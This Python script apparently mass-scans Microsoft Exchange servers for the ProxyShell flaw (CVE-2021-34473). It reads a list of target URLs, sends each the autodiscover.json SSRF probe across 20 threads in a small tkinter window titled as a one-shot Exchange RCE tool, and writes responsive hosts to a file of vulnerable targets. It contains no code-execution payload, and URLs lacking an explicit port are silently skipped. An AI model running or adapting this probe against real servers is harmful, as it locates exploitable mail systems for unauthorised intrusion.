import requests
import re
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
requests.packages.urllib3.disable_warnings()
def Microsoft_proxyshell_cve_2021_34473_exp(url):
    newurl = url.split('//')[1].split('/')[0]
    if ":" not in str(newurl):
        pass
    else:
        host = newurl.split(':')[0]
        testurl = f"https://{host}/autodiscover/autodiscover.json?@mss.com/owa/?&Email=autodiscover/autodiscover.json%3F@mss.com"
        try:
            req = requests.get(testurl, timeout=10, verify=False, allow_redirects=False)
            if (req.status_code == 302) and (re.search("errorfe.aspx", req.text)):
                Microsoft_proxyshell_cve_2021_34473_text.insert(END, "【！！！！！！】存在漏洞的url：" + testurl + "\n")
                Microsoft_proxyshell_cve_2021_34473_text.see(END)
                with open("存在Microsoft Exchange Server 远程代码执行漏洞的url.txt", 'a') as f:
                    f.write(testurl + "\n")
            else:
                Microsoft_proxyshell_cve_2021_34473_text.insert(END, "【×】不存在漏洞的url：" + testurl + "\n")
                Microsoft_proxyshell_cve_2021_34473_text.see(END)
        except Exception as err:
            Microsoft_proxyshell_cve_2021_34473_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
            Microsoft_proxyshell_cve_2021_34473_text.see(END)

def get_proxy_shell_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def Microsoft_proxyshell_cve_2021_34473_gui():
    Microsoft_proxyshell_cve_2021_34473 = tk.Tk()
    Microsoft_proxyshell_cve_2021_34473.geometry("910x450")
    Microsoft_proxyshell_cve_2021_34473.title("Microsoft Exchange RCE(cve-2021-34473)一把梭")
    Microsoft_proxyshell_cve_2021_34473.resizable(0, 0)
    Microsoft_proxyshell_cve_2021_34473.iconbitmap('logo.ico')
    global Microsoft_proxyshell_cve_2021_34473_text
    Microsoft_proxyshell_cve_2021_34473_text = scrolledtext.ScrolledText(Microsoft_proxyshell_cve_2021_34473,width=123, height=25)
    Microsoft_proxyshell_cve_2021_34473_text.grid(row=0, column=0, padx=10, pady=10)
    Microsoft_proxyshell_cve_2021_34473_text.see(END)
    addrs = get_proxy_shell_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(Microsoft_proxyshell_cve_2021_34473_exp, addr)
    Microsoft_proxyshell_cve_2021_34473.mainloop()